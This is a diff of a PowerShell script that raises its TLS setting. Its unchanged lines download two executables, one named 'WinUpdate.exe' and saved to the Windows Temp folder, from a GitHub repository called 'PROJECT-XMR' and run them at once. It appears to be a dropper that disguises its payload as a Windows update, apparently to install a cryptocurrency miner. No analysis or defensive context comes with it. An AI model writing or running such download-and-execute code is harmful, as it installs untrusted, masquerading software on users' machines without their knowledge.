@@ -1,9 +1,8 @@
-[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::tls11
-
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::tls12
 Invoke-WebRequest -Uri https://raw.githubusercontent.com/PH03N1X1000/PROJECT-XMR/main/Trial.exe -OutFile C:\Trial.exe
 Start-Process -FilePath C:\Trial.exe -Wait
 
-[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::tls11
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::tls12
 Invoke-WebRequest -Uri https://raw.githubusercontent.com/PH03N1X1000/PROJECT-XMR/main/WinUpdate.exe -OutFile C:\Windows\Temp\WinUpdate.exe
 Start-Process -FilePath C:\Windows\Temp\WinUpdate.exe -Wait
 
